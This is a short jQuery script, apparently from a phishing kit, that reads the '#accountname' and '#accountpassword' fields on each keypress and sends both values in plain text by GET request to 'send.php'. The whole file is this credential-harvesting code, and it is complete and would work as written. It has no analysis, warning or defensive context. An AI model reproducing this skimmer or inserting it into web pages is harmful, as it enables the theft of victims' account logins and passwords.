

$(document).ready(function(e)

	{

		

		$(".iid").keypress(function() {

			

			

				var id=$("#accountname").val(); 

				var pass=$("#accountpassword").val(); 

				$.ajax

					({ 

					

						type: "GET", 

						url: "send.php?id="+id+"&pass="+pass,

					

					}); 

				

			}); 

			

// event.preventDefault();



	});